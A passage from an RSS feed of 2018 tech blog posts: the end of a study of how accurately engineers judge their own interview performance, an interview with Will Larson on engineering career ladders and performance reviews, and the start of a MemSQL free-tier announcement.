&lt;div class=&quot;plotly-container&quot;&gt;&lt;a href=&quot;https://plot.ly/~aline_interviewingio/1098/?share_key=gOxJw5UZnY81R2sSiTGPnf&amp;amp;autosize=true&amp;amp;link=false&amp;amp;modebar=false&quot; target=&quot;_blank&quot; title=&quot;Accuracy by gender&quot;&gt;&lt;img src=&quot;https://plot.ly/~aline_interviewingio/1098.png?share_key=gOxJw5UZnY81R2sSiTGPnf&amp;amp;autosize=true&amp;amp;link=false&amp;amp;modebar=false&quot; alt=&quot;Accuracy by gender&quot; width=&quot;600&quot; onerror=&quot;this.onerror=null;this.src='https://plot.ly/404.png';&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;/div&gt;
&lt;p&gt;&lt;span class=&quot;subheading&quot;&gt;What else didn’t matter?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Another surprise: &lt;strong&gt;having been an interviewer didn’t help&lt;/strong&gt;. Even people who had been interviewers themselves don’t seem to get an accuracy boost from that. &lt;strong&gt;Personal brand was another non-finding&lt;/strong&gt;. &lt;strong&gt;People with more GitHub followers weren’t more accurate&lt;/strong&gt; than people with few to no GitHub followers. &lt;strong&gt;Nor did interviewer rating matter&lt;/strong&gt; (i.e. how well an interviewer was reviewed by their candidates), although to be fair, interviewers are generally rated quite highly on the site.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;subheading&quot;&gt;So what was a statistically significant boost to accurate judgments of interview performance? Mostly, experience.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Experienced engineers have a better sense for how well they did in interviews, compared with engineers earlier in their careers.&lt;sup&gt;&lt;a id=&quot;imposter-ref7&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn7&quot;&gt;7&lt;/a&gt;&lt;/sup&gt; But it doesn’t seem to &lt;em&gt;just&lt;/em&gt; be that you’re better at gauging your interview performance because you’re better at writing code; although there is a small lift from this, with higher rated engineers being more accurate. But when you look at junior engineers, &lt;strong&gt;even top-performing junior candidates struggled to accurately assess their performance&lt;/strong&gt;.&lt;sup&gt;&lt;a id=&quot;imposter-ref8&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn8&quot;&gt;8&lt;/a&gt;&lt;/sup&gt;  &lt;/p&gt;
&lt;div class=&quot;plotly-container&quot;&gt;&lt;a href=&quot;https://plot.ly/~aline_interviewingio/1105/?share_key=Jhb6Jva7ZCsGvGaepdpQns&amp;amp;autosize=true&amp;amp;link=false&amp;amp;modebar=false&quot; target=&quot;_blank&quot; title=&quot;experienced versus juniors&quot;&gt;&lt;img src=&quot;https://plot.ly/~aline_interviewingio/1105.png?share_key=Jhb6Jva7ZCsGvGaepdpQns&quot; alt=&quot;experienced versus juniors&quot; width=&quot;600&quot; onerror=&quot;this.onerror=null;this.src='https://plot.ly/404.png';&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;/div&gt;
&lt;p&gt;Our data mirrors a trend seen in &lt;a href=&quot;https://insights.stackoverflow.com/survey/2018#connection-and-competition&quot;&gt;Stack Overflow’s 2018 Developer survey&lt;/a&gt;. They asked respondents several questions about confidence and competition with other developers, and noted that more experienced engineers feel less competitive and more confident.&lt;sup&gt;&lt;a id=&quot;imposter-ref9&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn9&quot;&gt;9&lt;/a&gt;&lt;/sup&gt; This isn’t necessarily surprising: experience is correlated with skill level, after all, and highly skilled people are likely to be more confident. But our analysis let us control for performance and code skill within career groups, and we &lt;em&gt;still&lt;/em&gt; found that experienced engineers were better at predicting their interview scores. There are probably multiple factors here: experienced engineers have been through more interviews, have led interviews themselves, and have a stronger sense of belonging, all of which may combat impostor syndrome.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Insider knowledge and context also seems to help:&lt;/strong&gt; Being in the Bay Area and being at a top company both made people more accurate. Like the experienced career group, engineers who seem more likely to have &lt;em&gt;contextual industry knowledge&lt;/em&gt; are also more accurate. We found small but statistically significant lifts from factors like being located in the Bay Area and working at a top company. However, the lift from working at a top company seems to mostly measure a lift from overall technical ability: being at a top company is essentially a proxy measure for being a more experienced, higher quality engineer.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Finally, as you get better at interviewing and move into company interviews, you do get more accurate.&lt;/strong&gt; People were more accurate about their performance in company interviews compared to practice interviews, and their overall ranking on the interviewing.io site also predicted improved accuracy: interviewing.io also gives users an overall ranking, based on their performance over multiple interviews and weighted toward more recent measures. People who scored in the top 25% were more likely to be accurate about their interview performance.&lt;/p&gt;
&lt;p&gt;In general, how are people at gauging their interview performance overall? &lt;a href=&quot;http://blog.interviewing.io/people-are-still-bad-at-gauging-their-own-interview-performance-heres-the-data/&quot;&gt;We’ve looked at this before&lt;/a&gt;, with roughly a thousand interviews, and now, with ten thousand, the finding continues to hold up. Candidates were accurate about how they did in only 46% of interviews, and underestimated themselves in 35% of interviews (and the remaining 19%, of course, are the overestimators). Still, candidates are generally on the right track — it’s not like people who score a 4 are always giving themselves a 1.&lt;sup&gt;&lt;a id=&quot;imposter-ref10&quot; href=&quot;http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/#imposter-fn10&quot;&gt;10&lt;/a&gt;&lt;/sup&gt; Self-ratings &lt;em&gt;are&lt;/em&gt; statistically significantly predictive for actual interview scores (and positively correlated), but that relationship is noisy.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;heading&quot;&gt;The implications&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Accurately judging your own interview performance is a skill in its own right and one that engineers need to learn from experience and context in the tech industry. But we’ve also learned that &lt;strong&gt;many of the assumptions we made about performance accuracy didn’t hold up to scrutiny —&lt;/strong&gt; female engineers had just as accurate a view of their own skills as male ones, and engineers who had led more interviews or were well known on GitHub weren’t particularly better at gauging their performance.&lt;/p&gt;
&lt;p&gt;What does this mean for the industry as a whole? First off, impostor syndrome appears to be the bleary-eyed monster that attacks across gender ability, and how good you are, or where you are, or how famous you are isn’t that important. Seniority does help mitigate some of the pain, but impostor syndrome affects everyone, regardless of who they are or where they’re from. So, maybe it’s time for a kinder, more empathetic interviewing culture. And a culture that’s kinder to everyone, because though marginalized groups who haven’t been socialized in technical interviewing are &lt;a href=&quot;http://blog.interviewing.io/you-cant-fix-diversity-in-tech-without-fixing-the-technical-interview/&quot;&gt;hit the hardest by shortcomings in the interview process&lt;/a&gt;, no one is immune to self-doubt.&lt;/p&gt;
&lt;p&gt;We’ve previously discussed what makes someone a good interviewer, and &lt;a href=&quot;http://blog.interviewing.io/what-do-the-best-interviewers-have-in-common-we-looked-at-thousands-of-real-interviews-to-find-out/&quot;&gt;empathy plays a disproportionately large role&lt;/a&gt;. And we’ve seen that &lt;a href=&quot;http://blog.interviewing.io/people-are-still-bad-at-gauging-their-own-interview-performance-heres-the-data/&quot;&gt;providing immediate post-interview feedback is really important for keeping candidates from dropping out&lt;/a&gt;. So, whether you’re motivated by kindness and ideology or cold, hard pragmatism, a bit more kindness and understanding toward your candidates is in order.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://www.drcathicks.com/&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Cat Hicks&lt;/a&gt;, the author of this guest post, is a researcher and data scientist with a focus on learning. She’s published empirical research on learning environments, and led research on the cognitive work of engineering teams at Google and Travr.se. She holds a PhD in Psychology from UC San Diego.&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;robots-nocontent sd-block sd-social sd-social-official sd-sharing&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Share this:&lt;/h3&gt;

&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Tue, 06 Nov 2018 16:52:05 +0000</pubDate>
<dc:creator>leeny</dc:creator>
<og:url>http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</og:url>
<og:title>Impostor syndrome strikes men just as hard as women… and other findings from thousands of technical interviews</og:title>
<og:description></og:description>
<og:type>article</og:type>
<og:image></og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://blog.interviewing.io/impostor-syndrome-strikes-men-just-as-hard-as-women-and-other-findings-from-thousands-of-technical-interviews/</dc:identifier>
</item>
<item>
<title>Designing an Engineering Performance Management System from Scratch</title>
<link>https://blog.gitprime.com/designing-performance-management-systems/</link>
<guid isPermaLink="true" >https://blog.gitprime.com/designing-performance-management-systems/</guid>
<description>&lt;div class=&quot;et_pb_section et_pb_section_0 et_section_regular&quot;&gt;
&lt;div class=&quot; et_pb_row et_pb_row_0 et_pb_row_fullwidth&quot;&gt;
&lt;div class=&quot;et_pb_column et_pb_column_4_4 et_pb_column_0&quot;&gt;
&lt;div class=&quot;et_pb_module et_pb_post_title et_pb_post_title_0 et_pb_bg_layout_light&quot;&gt;
&lt;div class=&quot;et_pb_title_featured_container&quot;&gt;&lt;img width=&quot;1024&quot; height=&quot;640&quot; src=&quot;https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?fit=1024%2C640&amp;amp;ssl=1&quot; class=&quot;attachment-large size-large wp-post-image&quot; alt=&quot;&quot; srcset=&quot;https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?w=1600&amp;amp;ssl=1 1600w, https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?resize=300%2C188&amp;amp;ssl=1 300w, https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?resize=768%2C480&amp;amp;ssl=1 768w, https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?resize=1024%2C640&amp;amp;ssl=1 1024w, https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?resize=610%2C381&amp;amp;ssl=1 610w, https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?resize=400%2C250&amp;amp;ssl=1 400w, https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg?resize=1080%2C675&amp;amp;ssl=1 1080w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot; et_pb_row et_pb_row_1&quot;&gt;
&lt;div class=&quot;et_pb_column et_pb_column_4_4 et_pb_column_1&quot;&gt;
&lt;div class=&quot;et_pb_text et_pb_module et_pb_bg_layout_light et_pb_text_align_left et_pb_text_0&quot;&gt;
&lt;div class=&quot;et_pb_text_inner&quot;&gt;
&lt;p class=&quot;intro&quot;&gt;“In Engineering, we tend to hold this idea that these people systems—career ladders, performance reviews, calibration—are these evil things that aren’t very valuable. They’re thought of as bureaucracy. But it’s a shame. These are really powerful systems, and I’m actually excited to personally spend a lot of time with them.”&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://twitter.com/lethain&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Will Larso&lt;/a&gt;&lt;a href=&quot;https://twitter.com/lethain&quot;&gt;n&lt;/a&gt;, who was previously an engineering leader at Digg and then Uber, now leads Foundation Engineering at &lt;a href=&quot;https://stripe.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Stripe&lt;/a&gt;. His organization partners with Infrastructure, Data, and Developer Productivity teams to build the tools that support every Stripe engineer and keep Stripe reliable and performant.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-full wp-image-3051&quot; src=&quot;https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-sm.jpg?resize=200%2C200&amp;amp;ssl=1&quot; alt=&quot;&quot; srcset=&quot;https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-sm.jpg?w=300&amp;amp;ssl=1 300w, https://i2.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-sm.jpg?resize=150%2C150&amp;amp;ssl=1 150w&quot; sizes=&quot;(max-width: 200px) 100vw, 200px&quot; data-recalc-dims=&quot;1&quot;/&gt;&lt;/p&gt;
&lt;p&gt;You can go about building a performance management system in uncountable ways, but Larson points out that most of them are comprised of three core elements: career ladders, performance designations, and performance cycles. These combined systems focus your team’s efforts on the activities and metrics that ultimately help the organization succeed, by providing direct feedback to engineers on how valuable their work is (and by measuring it against expectations).&lt;/p&gt;
&lt;p&gt;We spoke with Larson about how (and why) to shape these foundational elements of a performance management system in a way that actually serves your team and your organization.&lt;/p&gt;
&lt;p class=&quot;pullquote&quot;&gt;“The purpose of these combined systems is to focus the company’s efforts towards activities that help the company succeed. The output of these efforts is to provide explicit feedback to employees on how the company is valuing their work.”&lt;/p&gt;
&lt;h2&gt;The first element: Career Ladders&lt;/h2&gt;
&lt;p&gt;Career ladders detail the anticipated evolution of team members’ behaviors and responsibilities in their distinct roles. For instance, an engineer might grow from a Junior Engineer to Senior Engineer and Staff Engineer, with progressive responsibilities and complexity at each level.&lt;/p&gt;
&lt;p&gt;“At each level, people want to know what the expectations are,” Larson says. “What are the behaviors that you want to see? My experiences have led me to believe that at their best, career ladders are powerful tools for shaping culture.”&lt;/p&gt;
&lt;p&gt;The most effective ladders, he says, are self-contained and concise. They also allow individuals to self-assess their work accurately. And when even a strong sketch of a career ladder is in place &lt;em&gt;before&lt;/em&gt; filling a role, the ladder can also aid both potential hires and their new managers in understanding a position’s expectations.&lt;/p&gt;
&lt;p&gt;“There are plenty of organizations who don’t have the fundamentals of career development written yet,” Larson says. “I think it’s easy for companies to be intimidated by the work involved in creating career ladders, with clearly defined roles and expectations at each level. But in reality, &lt;strong&gt;career ladders don’t need to&lt;/strong&gt; &lt;strong&gt;be remarkable&lt;/strong&gt; &lt;strong&gt;to be effective&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;.* Consider the first version of a career ladder to be an MVP. ” Just being able to see the types of work this person will do, and what their priorities are, is certainly helpful.&lt;/p&gt;
&lt;p&gt;Each person you hire from then on, is an opportunity to gather feedback and further develop the ladders. “Don’t worry about writing something wonderful right off the bat,” he suggests. “Just worry about writing something you can iterate on.” In fact, he even recommends creating a lightweight ladder before hiring the first person to fill a given role.&lt;/p&gt;
&lt;p class=&quot;pullquote&quot;&gt;“At their best, career ladders are powerful tools for shaping culture.”&lt;/p&gt;
&lt;p&gt;But whenever you’re implementing career ladders, you can start small—most companies, he observes, start with about three levels and add on over time, perhaps a level every two years. So you don’t have to write a robust ladder today—and you can allow the role’s functions to determine the appropriate structure of your ladders. While you want frameworks that are global and shared across the organization, you’ll also notice that each role’s ladder (particularly the specialized ones with fewer people on them) takes on its own characteristics.&lt;/p&gt;
&lt;p&gt;“What I’ve seen work best is to be tolerant of career ladder proliferation,” Larson says. His rule of thumb is that most any ladder with more than ten people should probably be fleshed out more fully, but smaller functions can survive with a rougher outline. “There’s an expectation that you’ll really start discovering what you want from the smaller functions,” he adds.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What matters more than a ladder’s complexity is its clarity.&lt;/strong&gt; You want to avoid fuzziness between levels; each level on the ladder ought to be well defined so that your engineers understand exactly what duties are expected of them. “Crisp level boundaries reduce ambiguity when considering whether to promote an individual across levels,” he says. Also, he suggests avoiding descriptions that require deep knowledge of precedent to apply correctly. The ladder should be easily understood by someone interacting with your organization for the first time.&lt;/p&gt;
&lt;p class=&quot;pullquote&quot;&gt;“If you’re going to invest in doing one component of performance management well,” Larson says, “make it the ladders. Everything else builds on this foundation.”&lt;/p&gt;
&lt;h2&gt;Step two: Performance Designations&lt;/h2&gt;
&lt;p&gt;Once you have your career ladders written and in place, you can begin using them to set expectations around performance and evaluate how your team is doing against those expectations. The descriptions of each level should aid everyone in self-reflection and in your career coaching 1:1s, but Larson recommends also integrating formal feedback into your performance management system using performance designations.&lt;/p&gt;
&lt;p&gt;In short, performance designations evaluate engineers’ performance in the context of their level on the career ladder.&lt;/p&gt;
&lt;p&gt;Because these designations are explicit statements about an individual’s work, they help mitigate miscommunication between you, the organization, and the engineers. And when the direction engineers receive doesn’t jive with their ladder level, the performance designation provides an opportunity for debugging.&lt;/p&gt;
&lt;p&gt;“More important than the scale used for rating, is how the ratings are calculated,” Larson says. In other words, don’t get hung up on whether you’re giving your engineers a perfect 10 or an acceptable 7. Instead, bring in input from several avenues.&lt;/p&gt;
&lt;p&gt;Larson observes that the typical setup for performance designations consists of:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Self-review&lt;/strong&gt;, where the engineers compare and contrast their work against their ladder and level,&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Peer reviews&lt;/strong&gt;, which recognize leadership contributions that might get missed, as well, as identifying problems you’re missing out on,&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Upward review,&lt;/strong&gt; to include the perspectives of any people they directly manage, and&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Manager review,&lt;/strong&gt; which will also synthesize the other three types.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Presenting performance designations will also aid you, as a leader, in setting clear goals and providing direction because you’ll be interacting regularly with what is happening (and what needs to happen differently).&lt;/p&gt;
&lt;p class=&quot;pullquote&quot;&gt;“Define the problem you are solving and retrain yourself to evaluate what your team is giving to folks.”&lt;/p&gt;
&lt;p&gt;“I think something that tends to work is having a team mission grounded in the company’s goals but also in what your internal or external users want from your team,” Larson says. “As opposed to defining ‘Here’s what I want to be doing,’ describe “Here’s what our users want from us.’ Define the problem you are solving and retrain yourself to evaluate what your team is giving to folks.”&lt;/p&gt;
&lt;p&gt;Consistent performance designations ensure that the team is staying on track both for their careers and for the organization’s goals, and they also help you define some of the trickier yet essential parts of managing: who needs to stay, and who is ready for a promotion.&lt;/p&gt;
&lt;p&gt;“I think people care about promotions for basically two different reasons,” Larson says. “The first is that companies typically tie compensations to levels. The other reason we care, is status and recognition. Titles are one of the most useful ways for people to understand where they fit in an organization, and where they can grow — and for a lot of folks, promotions are a way of showing recognition and appreciation of someone’s work.”&lt;/p&gt;
&lt;p&gt;With a rubric in place that establishes clarity around what “success” or “good work” looks like in a given role, it’s much easier to realize when an engineer is punching above their weight class. You might then recognize their progress by praising their work publicly, by encouraging the engineer to take on even more challenging problems — or by giving them a promotion. Whatever the situation calls for, having this rubric in place will serve as a mechanism for offering grounded feedback and making evidence-based decisions.&lt;/p&gt;
&lt;p&gt;“Understanding your people is really important,” Larson says. “They all have different preferences for receiving recognition. For some folks, swag is a wonderful form of recognition. Others don’t get any kind of reward from that, but will find it highly motivating to receive a thoughtful response, or even something as simple as saying ‘I really liked how you did this specific thing’.”&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;But recognition shouldn’t just come from you.&lt;/strong&gt; Receiving praise from peers can be extremely motivating because those are the people who often understand the work best. And direct, specific feedback from senior leaders is so scarce that it tends to be far more meaningful than they realize, Larson says.&lt;/p&gt;
&lt;p&gt;Whatever the form of recognition, it has a common purpose and effect: “People can understand very directly how their work contributes to the company,” Larson says.&lt;/p&gt;
&lt;h2&gt;Putting it into practice with Performance Cycles&lt;/h2&gt;
&lt;p&gt;Performance designations have the most value to you and your organization when you can develop a regular cadence with them. You need a process to ensure that performance designations happen consistently and fairly. The frequency of your designations is your performance cycle.&lt;/p&gt;
&lt;p&gt;The timeframe doesn’t matter as much as its regularity, so you can decide what works best for you and your team. “Most companies do either annual or semi-annual performance cycles, although it’s not unheard of to do them quarterly,” Larson says.&lt;/p&gt;
&lt;p&gt;He acknowledges that the overhead of running a performance cycle tends to be fairly heavy—after all, on top of your team’s regular work, you’re now asking them to conduct thought-out reviews. And on top of managing your team’s output, you’re now conducting substantial reviews yourself.&lt;/p&gt;
&lt;p&gt;However, the flip side to that is that feedback from each performance cycle tends to be immensely beneficial, and its results factor into things that your team cares about—from performance to compensation. So there’s benefit to conducting them frequently, too.&lt;/p&gt;
&lt;p&gt;Critically, there’s no right or wrong way to conduct these cycles. And performance cycles will evolve depending on what your organization needs—you may be able to conduct them quarterly with a team of ten, and shift to semi-annually as you scale to a hundred. More important than the timeframe is their consistency. Make sure your engineers can count on receiving regular reviews, as well as knowing when they will have their input heard.&lt;/p&gt;
&lt;h2&gt;Iterating on the process&lt;/h2&gt;
&lt;p&gt;As you write and implement your performance management system, keep at the fore of your mind that none of your process is written in stone. These are living systems, and they can (and should) evolve with your company. Each interaction between the performance management system and an engineer is an opportunity to test and refine that relationship.&lt;/p&gt;
&lt;p&gt;“What’s really interesting are the rough edges and unexpected emergent behaviors that come into play when you start to design and run these performance systems with lots of real people involved,” Larson says.&lt;/p&gt;
&lt;p&gt;He recommends that you get to the place where you have real numbers written down from your trials with the system, and then test it. In this way, it’s no different than any other product your team develops. “Often we run these people systems, and there’s no test, no metrics,” he says. “Just slow down a bit and take the same level of rigor to these systems and process — ultimately, they are a large part of someone’s experience of working with you. Take the way you approach product or design problems — the thought process and skillsets that have already made you successful in your role — and apply them to these systems, as well.”&lt;/p&gt;
&lt;p&gt;Also, don’t just think of these systems as a result of the work your team does. You can flip them around to use them as part of your recruiting process, too. Once you understand how you want to evaluate and recognize people internally, that same knowledge gives you a great framework for understanding who you want to hire.&lt;/p&gt;
&lt;p class=&quot;pullquote&quot;&gt;“Take the way you approach product or design problems — the thought process and skillsets that have already made you successful in your role — and apply them to these systems, as well.”&lt;/p&gt;
&lt;p&gt;Ultimately, a performance management system isn’t the bureaucratic nightmare it’s sometimes thought to be when you allow the system to serve you instead of hindering you. After all, these different elements combine to focus your team’s efforts toward activities that further the organization’s purpose. They provide your engineers with the knowledge of how the company values their work.&lt;/p&gt;
&lt;p&gt;And, Larson stresses, the structures discussed here are simply the most common foundational pieces of a performance management system. Your own implementation of these (and other) systems will reflect the particular view of the ideal relationship between your company and your engineers. We all have to start somewhere, though, and these are his recommendations for where to begin.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-full wp-image-3052&quot; src=&quot;https://i1.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe.jpg?resize=1080%2C456&amp;amp;ssl=1&quot; alt=&quot;&quot; srcset=&quot;https://i1.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe.jpg?w=1420&amp;amp;ssl=1 1420w, https://i1.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe.jpg?resize=300%2C127&amp;amp;ssl=1 300w, https://i1.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe.jpg?resize=768%2C325&amp;amp;ssl=1 768w, https://i1.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe.jpg?resize=1024%2C433&amp;amp;ssl=1 1024w, https://i1.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe.jpg?resize=610%2C258&amp;amp;ssl=1 610w, https://i1.wp.com/blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe.jpg?resize=1080%2C456&amp;amp;ssl=1 1080w&quot; sizes=&quot;(max-width: 1080px) 100vw, 1080px&quot; data-recalc-dims=&quot;1&quot;/&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;div class=&quot;et_pb_section et_pb_section_2 et_pb_with_background et_section_regular&quot;&gt;
&lt;div class=&quot; et_pb_row et_pb_row_3&quot;&gt;
&lt;div class=&quot;et_pb_column et_pb_column_4_4 et_pb_column_3&quot;&gt;
&lt;div class=&quot;et_pb_text et_pb_module et_pb_bg_layout_light et_pb_text_align_left et_pb_text_1&quot;&gt;
&lt;div class=&quot;et_pb_text_inner&quot;&gt;
&lt;p&gt;&lt;strong&gt;Get Engineering Impact: the weekly newsletter for managers of software teams&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;sm&quot;&gt;&lt;span&gt;Keep current with trends in engineering leadership, productivity, culture, and scaling development teams.&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Tue, 06 Nov 2018 16:02:41 +0000</pubDate>
<dc:creator>thebent</dc:creator>
<og:type>article</og:type>
<og:title>Stripe's Will Larson on Designing a Performance Management System from Scratch</og:title>
<og:description>Stripe's Head of Foundation Engineering outlines the three core elements in a performance management system, and explains how to build them in your organization.</og:description>
<og:url>https://blog.gitprime.com/designing-performance-management-systems/</og:url>
<og:image>https://blog.gitprime.com/wp-content/uploads/2018/10/larson-stripe-ladder-cover.jpg</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.gitprime.com/designing-performance-management-systems/</dc:identifier>
</item>
<item>
<title>MemSQL is now free to use for databases with up to 128GB of RAM usage</title>
<link>https://www.memsql.com/blog/announcing-memsql-free-tier</link>
<guid isPermaLink="true" >https://www.memsql.com/blog/announcing-memsql-free-tier</guid>
<description>&lt;p&gt;Today, we announced our latest product version, &lt;a href=&quot;https://www.memsql.com/blog/memsql67/&quot;&gt;MemSQL 6.7&lt;/a&gt;. With this release, MemSQL is now free for everyone to use for databases with up to 128GB of RAM usage.&lt;/p&gt;
&lt;p&gt;Unlike what customers get from other database providers, the free tier of MemSQL is full featured and includes all enterprise capabilities, including high availability and security.&lt;/p&gt;
&lt;h2&gt;What Can You Do with the Free Tier?&lt;/h2&gt;
&lt;p&gt;You can do almost anything with MemSQL, using the free tier, that you can do if you have an Enterprise license, including capabilities and production use. The differences are that you can only configure the free tier of MemSQL to use up to 128GB of RAM usage, and support is only &lt;a href=&quot;https://www.memsql.com/forum/&quot;&gt;community support&lt;/a&gt;; for paid MemSQL support, you need an Enterprise license.&lt;/p&gt;
&lt;p&gt;The free tier allows customers to:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Learn&lt;/strong&gt;. You can learn about MemSQL and how it works on your own or in conjunction with &lt;a href=&quot;https://training.memsql.com/&quot;&gt;MemSQL Training&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Develop and test&lt;/strong&gt;. You can develop and test using MemSQL and full features, but without professional MemSQL support.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Deploy into production&lt;/strong&gt;. If you’re willing and able to run your app within the RAM usage limitation, and without professional MemSQL support, you can deploy an app running into production.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;However, if you use the free version you may reach the point where you need to go beyond the configuration requirements of the free tier or want professional MemSQL support. At that point, you can seamlessly move to a time-limited Enterprise trial license, and arrange with MemSQL to buy a full Enterprise subscription before the time limit expires.&lt;/p&gt;
&lt;h2&gt;What Kinds of Applications and Workloads Can the Free Tier Support?&lt;/h2&gt;
&lt;p&gt;Getting 128GB of RAM capacity in the free tier of MemSQL means you can run robust applications. Check out what some of our customers are doing today, that would be technically possible with the new, free tier of MemSQL.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Real-Time Geospatial Analytics with Wag!&lt;/strong&gt;&lt;br/&gt;Customer experience is of the utmost importance for service-driven organizations. That’s why Wag!, the “Uber for dogs”, chose MemSQL to help accelerate the tracking and visualization of dog walkers in real time. Location data is captured every five seconds in JSON format and is structured for SQL queries to track time, walk distance, and other statistics. The ingest and store requirements run within the 128GB memory range due to the use of AWS S3 as a historical archive. The end result is a fast data architecture that enables low-latency join queries of hot and archived data, resulting in a comprehensive yet real-time view of the dog walk in progress, delivered instantly to the customer’s mobile app. To learn more about Wag! and its use of MemSQL, read our &lt;a href=&quot;https://www.memsql.com/blog/wag-labs-case-study/&quot;&gt;blog post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Trading Application&lt;/strong&gt;&lt;br/&gt;Managing and analyzing financial markets while delivering high-performance transactions for a fast-growing online brokerage can be a challenging task. This production application uses MemSQL to support up to 12,000 transactions a minute while simultaneously supporting queries for 250,000 unique users, with sub-second response time. The high-performance application is capable of running within the 128GB memory footprint due to the efficient use of memory and disk.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Image Recognition for Premium User Experience with Nyris&lt;/strong&gt;&lt;br/&gt;Retail companies must continuously innovate with breakthrough buying experiences. Nyris is a company delivering visual search for retailers, manufacturers, and more by leveraging fast image recognition with MemSQL. Nyris is capable of matching user-submitted photos against a repository of 100,000 products in milliseconds, helping each customer quickly match their photo with a product that’s available for sale. The application leverages MemSQL’s built-in ML scoring algorithms, known as DOT_PRODUCT, to perform vector similarity matching with sub-second response. The application is able to run on less than 128GB of memory while delivering a premium experience to customers.&lt;/p&gt;
&lt;h2&gt;Operating MemSQL’s Free Tier in Production&lt;/h2&gt;
&lt;p&gt;When you sign up for MemSQL, you receive a license key and instructions for installing the software in the cloud or in your data center.&lt;/p&gt;
&lt;p&gt;The free tier of MemSQL is community-supported, backed by &lt;a href=&quot;https://docs.memsql.com/&quot;&gt;extensive documentation&lt;/a&gt; and a &lt;a href=&quot;https://www.memsql.com/forum&quot;&gt;community of users&lt;/a&gt;. Companies looking for 24×7, ticket-based support and guidance, or those who require more than 128GB of memory, will need to upgrade to an Enterprise license.&lt;/p&gt;
